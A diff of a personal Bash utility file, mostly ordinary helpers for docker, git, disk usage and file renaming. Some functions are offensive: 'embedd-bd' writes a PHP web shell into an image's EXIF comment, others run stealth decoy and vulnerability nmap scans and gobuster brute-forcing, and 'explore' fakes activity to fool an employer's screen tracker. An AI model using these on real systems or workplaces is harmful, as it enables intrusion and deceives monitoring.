@@ -1,179 +1,365 @@
-#!/bin/bash
+#!/usr/bin/env bash
+# shellcheck shell=bash
+# sourced utility functions
+
+# guard against multiple sourcing
+[[ -n "${__MY_FUNCS_LOADED:-}" ]] && return
+__MY_FUNCS_LOADED=1
+
+# import .env
+import() {
+    set -a
+    source "$1"
+    set +a
+}
+
+docker-clean-all () {
+    docker container prune -f
+    docker image prune -f
+    docker volume prune -f
+}
+
+clean-rust () {
+    find . -type d -name target -exec rm -rf {} + -o -type f -name Cargo.lock -exec rm -f {} +
+}
 
 # check LAN cable for all network interfaces
-function check-lan() {
+check-lan() {
     for interface in /sys/class/net/*; do
-        echo "$interface: carrier $(cat $interface/carrier), operstate $(cat $interface/operstate)"
+        echo "$interface: carrier $(cat "$interface/carrier"), operstate $(cat "$interface/operstate")"
     done
 }
 
-# execute command forever with timeout
-function run-forever(){
-    timeout=${2:-1}
-    while true; do
-        eval $1
-        sleep $timeout
-    done
-}
-
-# iterate through all subdirs and execute a command
-function execr(){
-    for dir in */; do
-        cd $dir
-        $1
-        cd ..
-    done
-}
+# # execute command forever with timeout
+# run-forever() {
+#     local cmd timeout
+#     cmd="$1"
+#     timeout="${2:-1}"
+#
+#     while true; do
+#         bash -c "$cmd"
+#         sleep "$timeout"
+#     done
+# }
+#
+# # iterate through all subdirs and execute a command
+# execr() {
+#     local dir cmd
+#     cmd="$1"
+#
+#     for dir in */; do
+#         (
+#             cd "$dir" || exit
+#             bash -c "$cmd"
+#         )
+#     done
+# }
 
 # Show local/public IP adresses with or without interface argument using a shell
-function local-ip(){
-    echo -e "local:\n$(ifconfig $1 | grep -oP 'inet (add?r:)?\K(\d{1,3}\.){3}\d{1,3}')\n\npublic:\n$(curl -s sputnick-area.net/ip)";
+local-ip(){
+    local iface=${1:-}
+    echo -e "local:"
+    ip addr show "$iface" | awk '/inet /{print $2}' | cut -d/ -f1
+    echo
+    echo "public:"
+    curl -s https://api.myip.com
 }
 
-# convert all files in directory in one pdf with pwd name
-# imagemagick required
-# and this should be changed in /etc/ImageMagick-*/policy.xml
-# <policy domain="coder" rights="read | write" pattern="PDF" />
-# there was some vulnerability bug in Ghostscript
-# check the security advisory before usage
-# https://www.ghostscript.com
-function all-to-pdf() {
-    wd=$(basename $(pwd))
-    convert -density 300 -depth 8 -quality 20 -compress jpeg `ls *.[jJ][pP][gG]` $wd.pdf
+# gobuster password authentication examples
+gobust() {
+    gobuster -e -u "$1" -w wordlist
 }
+
+# NMAP
+# This command will perform a stealth SYN scan (-sS) using a decoy list of 10 random IP addresses (-D RND:10)
+# and using your IP address as a source IP address (ME).
+# It will not ping the target (-Pn) and will run a script to check for vulnerabilities
+# (--script vuln) and save the output to a file called scan_result.txt (-oN scan_result.txt).
+nmap-stealth-syn() {
+    nmap -sS -D RND:10,ME -Pn --script vuln -oN scan_result.txt "$1"
+}
+
+# Aggressive scan to determine host OS
+nmap-aggressive() {
+    nmap -Pn -A -T4 "$1"/24
+}
+
 
 # add file to an image as a comment
 # exiftool must be installed
-function embedd-to-image() {
-    exiftool "-comment<=$1" $2
+embedd-to-image() {
+    exiftool "-comment<=$1" "$2"
 }
 
 # embed php toy webbackdoor
-function embedd-bd() {
+embedd-bd() {
     echo "<?php system(\$_GET['cmd']);?>" > bd
-    exiftool "-comment<=bd" $1
+    exiftool "-comment<=bd" "$1"
     rm bd
 }
 
-# Analyze the disk usage and sort by size
-function size-check() {
-    # If no path is entered, use the current directory
-    path=${1:-.}
-    th=${2:-"500M"}
-    ech "Analysing disk usage..."
-    du -h -d 1 --threshold=$th $path | sort -hr
+biggest-dirs(){
+    local path th
+    path=${1:-"."}  # default current directory
+    th=${2:-"500M"} # default 500M threshold
+
+    echo "Analysing disk usage..."
+    sudo du -h --max-depth=5 "$path" --threshold="$th" 2>/dev/null | sort -hr | head -n 20
 }
 
-# Show local/public IP adresses with or without interface argument using a shell
-function local-ip(){
-    echo -e "local:\n$(ifconfig $1 | grep -oP 'inet (add?r:)?\K(\d{1,3}\.){3}\d{1,3}')\n\npublic:\n$(curl -s sputnick-area.net/ip)";
+# create install USB from ISO
+# burn-usb-iso /dev/sdb /path/to/my.iso
+burn-usb-iso() {
+    local iso disk
+    disk=$1
+    iso=$2
+
+    (
+        set -x
+        sudo dd if="$iso" of="$disk" bs=8M
+    )
 }
 
-# find and replace "apt-get" with "apt" for all files in a directory
-find /path/to/directory -type f -exec sed -i 's/apt-get/apt/g' {} +
+# show logs without weird sequences
+# sudo apt install colorized-logs
+logless(){
+    ansi2txt < $1 | less
+}
 
-# simple echo of IPv4 IP addresses assigned to a machine
-ip addr | awk '/inet / {sub(/\/.*/, "", $2); print $2}'
+strip-logs() {
+    local in out
+    in=${1:-"input.log"}
+    out=${2:-"output.log"}
 
-# shorten url using curl, sed and is.gd
-curl -s -d URL="$1" https://is.gd/create.php | sed '/Your new shortened/!d;s/.*value="\([^"]*\)".*/\1/'
+    # Strips all escape sequences and control codes from stdin.
+    cat -p "$in" | sed -e 's,[\x00-\x08\x0E-\x1F]\|\x1B\(\[[0-?]*[ -/]*[@-~]\),,g' > "$out"
+}
 
-# Gets the X11 Screen resolution
-echo $(xrandr | grep '*' | sed 's/\s*\([0-9x]*\).*/\1/')
 
-# remove all files with pattern in name recursively
-# example for all pdfs
-find -type f -name '*pdf' -print0 | xargs -0 rm
+rot13() {
+    cat -p | tr "$(echo -n {A..Z} {a..z} | tr -d ' ')" "$(echo -n {N..Z} {A..M} {n..z} {a..m} | tr -d ' ')"
+}
 
-# find large files
-find . -type f -size +1100000k |xargs -I% du -sh %
+sup() {
+    local pids
+    if [ -z "$1" ]; then
+        echo "Check the memory and CPU the process currently holds.\nUsage: sup <process_name>"
+        return 1
+    fi
 
-# Generate a quick, lengthy password
-head /dev/urandom | md5sum | base64
-# Create a random password encrypted with md5 with custom lenght
-echo -n $n | md5sum | awk {'print $1'}
+    pids=$(pgrep -f "$1" | paste -sd, -)
 
-# Load functions from a current directory
-SCRIPTPATH=$(readlink -f $(dirname $0))
-. "$SCRIPTPATH/script.sh"
+    if [ -z "$pids" ]; then
+        echo "No matching processes found for '$1'"
+        return 1
+    fi
 
-# Create a tar file with the current date in the name.
-tar cfz backup-`date +%F`.tgz somedirs
+    ps -p "$pids" -o pid=,rss=,pcpu= | awk '
+    {mem+=$2; cpu+=$3}
+END {
+    printf "Memory: %.2f MB\n", mem/1024
+    printf "CPU: %.2f%%\n", cpu
+}'
+}
 
-# This is forcing user to enter password (once).
-sudo true
+# wargames <user>
+wargames() {
+    ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password  -p 2220 "$1"@bandit.labs.overthewire.org
+}
 
-# shell name
-me=$(basename $0)
+git-sign-all-commits() {
+    # to make it better - add key to an ssh-agent
+    git rebase --exec 'git commit --amend --no-edit -S' -i --root
+}
+git-sign-n() {
+    local n
 
-# Check if variable is a number
-if [ "$testnum" -eq "$testnum" 2>/dev/null ]; then echo It is numeric
+    n=${1:-1}
+    git rebase --exec 'git commit --amend --no-edit -S' HEAD~"$n"
+}
+git-reset-author() {
+    git rebase -r --root --exec 'git commit --amend --no-edit --reset-author'
+}
+git-rename() {
+    OLD=${1:- };
+    NEW=${2:- };
+    echo old: $OLD new: $NEW;
 
-# Delete newline
-tr -d "\n" < file1 > file2
-# Delete leading whitespace from the start of each line
-sed 's/^\s*//' input.txt
+    git ls-files -z | xargs -0 sed -i -e "s/$OLD/$NEW/g"
+}
 
-# extract json field
-field=$(cat $(dirname $0)/some.json | jq -r '.top-object.sub-object.field')
+git-rm-files-from-history() {
+    local path="$1"
 
-# Probably, most frequent use of diff
-diff -Naur --strip-trailing-cr
-# Remove executable bit from all files in the current directory recursively, excluding other directories
-find . ! -type d -exec chmod -x {}\;
+    if [[ -z "$path" ]]; then
+        echo "You must specify a path to remove from git history."
+        echo
+        echo "Usage:"
+        echo "  git-rm-files-from-history path/to/file"
+        echo
+        echo "Largest blobs in history (for reference):"
+        git rev-list --objects --all \
+            | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' \
+            | awk '$1=="blob" {print $3 "\t" $4}' \
+            | sort -rn | head
+        return 1
+    fi
 
-# list all file extensions in a directory
-find /path/to/dir -type f | grep -o '\.[^./]*$' | sort | uniq
+    echo "⚠️  WARNING:"
+    echo "This will rewrite git history and affect all branches and tags."
+    echo "You should back up your repository first."
+    echo
+    read -r -p "Continue? (y/N) " choice
 
-# Delete Empty Directories
-find . -type d -exec rmdir {} \;
+    case "$choice" in
+        y|Y)
+            echo "Removing '$path' from git history..."
+            git filter-branch --force \
+                --index-filter "git rm --cached --ignore-unmatch '$path'" \
+                --prune-empty \
+                --tag-name-filter cat \
+                -- --all
+            echo
+            echo "✅ Done."
+            echo "Next steps:"
+            echo "  git push --force --all"
+            echo "  git push --force --tags"
+            ;;
+        *)
+            echo "Operation canceled."
+            return 1
+            ;;
+    esac
+}
 
-# GRUB2: Set Imperial Death March as startup tune
-echo 'GRUB_INIT_TUNE=\"480 440 4 440 4 440 4 349 3 523 1 440 4 349 3 523 1 440 8 659 4 659 4 659 4 698 3 523 1 415 4 349 3 523 1 440 8"\"' | sudo tee -a /etc/default/grub > /dev/null && sudo update-grub
+zj-reset() {
+    mv ~/.cache/zellij/permissions.kdl .
+    rm -rf ~/.cache/zellij/*
+    mv permissions.kdl ~/.cache/zellij/permissions.kdl
+}
 
-# set prompt and terminal title to display hostname, user ID and pwd
-export PS1='\[\e]0;\h \u \w\a\]\n\[\e[0;34m\]\u@\h \[\e[33m\]\w\[\e[0;32m\]\n\$ '
 
-# Type strait into a file from the terminal.
-cat /dev/tty > FILE
+restart-plasma(){
+    killall plasmashell
+    plasmashell &
+}
 
-# most used unix commands
-cut -d\    -f 1 ~/.bash_history | sort | uniq -c | sort -rn | head -n 10 | sed 's/.*/    &/g'
+# normalize the name into kebab-case
+# replace all spaces with -
+# replace weird youtube ticks by normal ones
+# clean up repeating dashes
+#
+# # example
+# normalize <file> [prefix]
+#
+# ```bash
+# normalize "Artes undead - --pilates.mp3"
+# artes-undead-pilates.mp3
+#
+# ```
+normalize() {
+    local normalize_name prefix temp
+    normalize_name="$1"
+    prefix=${2:-""}
+    temp="$prefix$(echo "$normalize_name" | tr '[:upper:]' '[:lower:]' | \
+        sed 's/ \[[^]]*\]//g' | \
+        sed 's/[＂"]\|[＂"]//g' | \
+        sed 's/\.-\| \./-/g' | \
+        sed 's/\\//g' | \
+        sed 's/ /-/g' | \
+        sed 's/,/-/g' | \
+        sed 's/-–-/-/g' | \
+        sed 's/--/-/g' | \
+        sed 's/&/and/g' | \
+        sed 's/,-/-/g')"
 
-# Discspace utils
-# see your physical disks
-sudo lsblk --scsi
+    echo "$temp"
+}
 
-# list all partitions and block devices including boot, swap, efi etc.
-df -Th
+# prefix all, lowercase and remove anything that matches " \[[*]]*\]"
+# which is a usual yt-dlp residual
+# usage:
+# prefix-all <the-group> [PATTERN]
+prefix-all(){
+    local prefix patt new
 
-# disable backlight to preserve power as a cronjob
-*/10 * * * * echo "0" > /sys/class/backlight/intel_backlight/brightness
+    prefix=${1:-""}
+    patt=${2:-"*"}
+    echo "prefix $prefix"
 
-# create bootable from terminal, sdX is your volume, check from lsblk
-bzcat steamdeck-repair-20250521.10-3.7.7.img.bz2 | sudo dd if=/dev/stdin of=/dev/sdX oflag=sync status=progress bs=128M
+    find . -name "$patt" -type f -print0 -exec bash -c '
+    normalize() {
+        local normalize_name prefix temp
 
-# rename a FAT32 volume
-sudo fatlabel /dev/sdXX "MA DISK"
+        prefix=${2:-""}
+        normalize_name=$(basename "$1")
+        temp="$prefix$(echo "$normalize_name" | tr "[:upper:]" "[:lower:]" | \
+            sed "s/ \[[^]]*\]//g" | \
+            sed "s/[＂\"]\|[＂\"]//g" | \
+            sed "s/\.-\| \./-/g" | \
+            sed "s/ /-/g" | \
+            sed "s/---/-/g; s/--/-/g" | \
+            sed "s/-–-/-/g" | \
+            sed "s/--/-/g" | \
+            sed "s/_/-/g" | \
+            sed "s/,-/-/g")"
 
-# rename an ext4 volume
-sudo e2label -L "MA DISK" /dev/sdX
+        echo "$temp"
 
-# change LUKS key
-sudo cryptsetup luksChangeKey /dev/sdX
+    }
 
-# format USB stick to FAT32 volume
-# (Optional but recommended) Wipe old signatures. This prevents weird mount issues.
-sudo wipefs -a /dev/sdX
-sudo parted /dev/sdX --script mklabel msdos
-sudo parted /dev/sdX --script mkpart primary fat32 1MiB 100%
-sudo mkfs.vfat -F 32 -n MA-USB-STEEK /dev/sdb1
+new=$(normalize "$0" "$1")
+mv -v "$0" "$new"' {} "$prefix" \;
 
-# format USB windows compatible
-umount /dev/sdX
-sudo fdisk /dev/sdX
-# Create a new (dos) partition table: press o and enter.
-# Create a new partition: press n, enter and accept default options.
-# Change the partition type to HPFS/NTFS/exFAT: press t, enter, 7, enter.
-sudo mkfs.exfat -n "my label" /dev/sdX1
+# will create a lot of empty directories
+find . -type d -print0 -empty -delete
+}
 
+# dumb screen tracker exploit for soulless corporate jobs I used to use as as a junior
+explore() {
+    local rnds c WIDS id
+    rnds=${1:-100}
+    echo "rnds $rnds"
+
+    for ((c=1; c<=rnds; c++)); do
+        sleep 5
+        WIDS=$(xdotool search --onlyvisible "gnome-terminal")
+        xdotool search "Mozilla" windowactivate --sync
+        sleep 540
+        xdotool search "Visual Studio Code" windowactivate --sync
+
+        for id in $WIDS; do
+            sleep 540
+            xdotool windowactivate "$id"
+        done
+        echo "done $c"
+    done
+    echo "done end"
+}
+
+work_test() {
+    local rnds c WIDS id
+    rnds=${1:-3}
+    echo "rnds $rnds"
+
+    for ((c=1; c<=rnds; c++)); do
+        sleep 5
+        WIDS=$(xdotool search --onlyvisible "gnome-terminal")
+        xdotool search "Mozilla" windowactivate --sync
+        sleep 1
+        xdotool search "Visual Studio Code" windowactivate --sync
+
+        for id in $WIDS; do
+            sleep 1
+            xdotool windowactivate "$id"
+        done
+        echo "done $c"
+    done
+    echo "done end"
+}
+
+utils-help() {
+    declare -F | awk '{print $3}' | sort
+}
+
+return 0 2>/dev/null || true
